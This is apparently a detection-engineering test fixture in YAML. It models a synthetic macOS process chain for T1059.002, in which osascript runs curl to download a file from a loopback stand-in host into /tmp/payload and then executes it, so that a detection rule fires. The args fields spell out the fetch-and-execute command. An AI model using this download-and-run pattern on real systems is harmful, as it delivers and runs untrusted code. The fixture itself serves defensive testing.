# T1059.002 Command and Scripting Interpreter: AppleScript (+ T1105 Ingress
# Tool Transfer). Synthetic chain: osascript -> curl downloading to /tmp ->
# exec of the staged binary. The osascript_network_exec rule recognises this
# three-step shape (osascript as ancestor + curl/wget descendant + exec from
# a temp prefix) and fires on the trigger exec.
name: "T1059.002 osascript -> curl -> /tmp/payload chain"
host:
  id: AAAA1059-0002-0000-0000-000000000002
  hostname: efficacy-t1059-002.local
  os: macOS 26.0
timeline:
  # osascript launches.
  - at: 0ms
    type: fork
    child_pid: 6001
    parent_pid: 1
  - at: 10ms
    type: exec
    pid: 6001
    ppid: 1
    path: /usr/bin/osascript
    args: ["osascript", "-e", "do shell script \"curl -o /tmp/payload http://127.0.0.1:9/x\""]
    cwd: /tmp
    uid: 501
    gid: 20

  # osascript spawns a curl that stages a binary to /tmp.
  - at: 50ms
    type: fork
    child_pid: 6002
    parent_pid: 6001
  - at: 60ms
    type: exec
    pid: 6002
    ppid: 6001
    path: /usr/bin/curl
    args: ["curl", "-o", "/tmp/payload", "http://127.0.0.1:9/x"]
    cwd: /tmp
    uid: 501
    gid: 20

  # The chain's payload exec -- the rule fires here.
  - at: 100ms
    type: fork
    child_pid: 6003
    parent_pid: 6001
  - at: 110ms
    type: exec
    pid: 6003
    ppid: 6001
    path: /tmp/payload
    args: ["/tmp/payload"]
    cwd: /tmp
    uid: 501
    gid: 20
